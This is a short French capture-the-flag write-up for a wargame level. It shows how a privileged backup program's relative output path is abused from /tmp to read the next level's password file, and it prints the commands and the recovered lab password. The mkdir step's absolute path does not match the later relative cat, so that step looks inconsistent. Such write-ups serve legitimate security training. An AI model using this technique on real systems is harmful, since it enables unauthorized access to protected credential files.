# Level 08

Le programme ouvre un fichier et en fait un backups dans le dossier `./backups`, il écrit aussi des logs dans le fichier `./backups/.log`.

Nous pouvons donc lui demander de faire un backups du fichier `/home/users/level09/.pass`.

```shell
~ ./level08 /home/users/level09/.pass
ERROR: Failed to open ./backups//home/users/level09/.pass
```

Nous avons une erreur car il n'arrive pas à ouvrir un nouveau fichier `/home/users/level08/backups//home/users/level09`

N'ayant pas les droits d'écriture dans le home de l'user level08, nous pouvons aller dans `/tmp` un dossier ou nous avons les droits d'écriture.

Pour éviter de d'avoir une erreur car le path `./backups//home/users/level09/` n'existe pas dans tmp, nous allons le créer.

Il ne nous reste plus qu'a lancer le programme avec le fichier `.pass` de level09 et de le cat dans le dossier backups.

```shell
~ cd /tmp
~ mkdir -p /backups//home/users/level09/
~ ~/level08 /home/users/level09/.pass
~ cat backups/home/users/level09/.pass
fjAwpJNs2vvkFLRebEvAQ2hFZ4uQBWfHRsP62d8S
```



